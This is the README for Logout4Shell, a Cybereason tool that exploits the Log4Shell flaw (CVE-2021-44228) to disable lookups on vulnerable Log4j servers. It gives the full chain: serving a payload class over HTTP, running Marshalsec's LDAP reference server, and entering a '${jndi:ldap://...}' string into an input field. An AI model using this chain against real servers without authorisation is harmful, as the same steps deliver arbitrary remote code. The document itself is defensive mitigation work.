# Logout4Shell
![logo](https://github.com/Cybereason/Logout4Shell/raw/main/assets/CR_logo.png)

## Description 
A vulnerability impacting Apache Log4j versions 2.0 through 2.14.1 was disclosed on the project’s Github on December 9, 2021. The flaw has been dubbed “Log4Shell,”, and has the highest possible severity rating of 10. Software made or managed by the Apache Software Foundation (From here on just "Apache") is pervasive and comprises nearly a third of all web servers in the world—making this a potentially catastrophic flaw.
The Log4Shell vulnerability CVE-2021-44228 was published on 12/9/2021 and allows remote code execution on vulnerabe servers.

While the best mitigation against this vulnerability is to patch log4j to
2.15.0 and above, in Log4j version (>=2.10) this behavior can be mitigated by
setting system property `log4j2.formatMsgNoLookups` to `true` or by removing
the JndiLookup class from the classpath. 
Additionally, if the server has Java runtimes >= 8u121, then by default, the
settings `com.sun.jndi.rmi.object.trustURLCodebase` and
`com.sun.jndi.cosnaming.object.trustURLCodebase` are set to “false”, mitigating this risk.

However, enabling these system property requires access to the vulnerable servers as well as a restart. 
The [Cybereason](https://www.cybereason.com) research team has developed the
following code that _exploits_ the same vulnerability and the payload therein
forces the logger to reconfigure itself with the vulnerable setting disabled -
this effectively blocks any further attempt to exploit Log4Shell on this server

You can learn more [here](https://www.cybereason.com/blog/cybereason-releases-vaccine-to-prevent-exploitation-of-apache-log4shell-vulnerability-cve-2021-44228)

## How it works
The payload and exploit below use the java runtime to reconfigure the logger. 
Prior to reconfiguring the global setting
`FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS` is set to True, disabling message
format lookups and preventing further exploitation of this attack

## How to use

1. Download this report and build it 

   1.1 `git clone https://github.com/cybereason/Logout4Shell.ssh`

   1.2 build it - `mvn package`

   1.3 `cd target/class`

   1.4 run the webserver - `python3 -m http.server 8888`

2. Download, build and run Marshalsec's ldap server

   2.1 `git clone https://github.com/mbechler/marshalsec.git`

   2.2 `mvn package -DskipTests`

   2.3 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCE"`

3. To immunize a server

   3.1 enter `${jndi:ldap://<IP_OF_LDAP_SERVER_FROM_STEP_2>:1389/a}` into a vulnerable field (such as user name)


## DISCLAIMER: 
The code described in this advisory (the “Code”) is provided on an “as is” and
“as available” basis may contain bugs, errors and other defects. You are
advised to safeguard important data and to use caution. By using this Code, you
agree that Cybereason shall have no liability to you for any claims in
connection with the Code. Cybereason disclaims any liability for any direct,
indirect, incidental, punitive, exemplary, special or consequential damages,
even if Cybereason or its related parties are advised of the possibility of
such damages. Cybereason undertakes no duty to update the Code or this
advisory.


## Credits
The initial repo and inspiration for this work is based on the work of [tangxiaofeng7/apache-log4j-poc](https://github.com/tangxiaofeng7/apache-log4j-poc)
